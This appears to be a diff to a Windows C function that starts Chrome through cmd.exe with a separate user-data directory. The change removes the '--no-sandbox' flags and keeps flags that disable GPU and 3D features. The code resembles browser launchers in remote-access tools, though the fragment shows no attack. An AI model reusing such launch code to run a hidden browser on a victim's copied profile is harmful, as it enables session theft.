@@ -233,7 +233,7 @@ static void StartChrome()
 	char path[MAX_PATH] = { 0 };
 	lstrcatA(path, "cmd.exe /c start ");
 	lstrcatA(path, "chrome.exe");
-	lstrcatA(path, " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11  --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=");
+	lstrcatA(path, " --disable-3d-apis --disable-gpu --disable-d3d11  --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=");
 	lstrcatA(path, (PCHAR)"\"");
 	lstrcatA(path, newDataPath);
 
